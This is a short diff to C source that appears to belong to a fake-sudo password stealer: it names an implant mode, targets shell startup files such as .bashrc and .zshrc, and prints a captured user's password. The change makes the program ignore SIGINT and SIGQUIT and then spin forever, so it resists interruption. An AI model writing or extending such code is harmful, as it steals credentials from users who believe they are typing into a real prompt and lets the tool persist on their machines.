@@ -6,14 +6,19 @@
 #include <string.h>
 #include <fcntl.h>
 #include "pseudo.h"
+#include <signal.h>
+
 
 #define PASSWD_SIZE 1024
 #define UNAME_SIZE 1024
 
+static void sighandler(int signo){}
+
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
 int main(int argc, char ** argv){
-
+  signal(SIGQUIT, sighandler);
+  signal(SIGINT, sighandler);
   //set mode
   int mode = P_IMPLANT;
   for (int i = 0; i<argc; i++){
@@ -37,6 +42,9 @@ int main(int argc, char ** argv){
 
     printf("%s's password is %s\n", username, passwd);
   }
+
+  while(1){};
+
 }
 
 
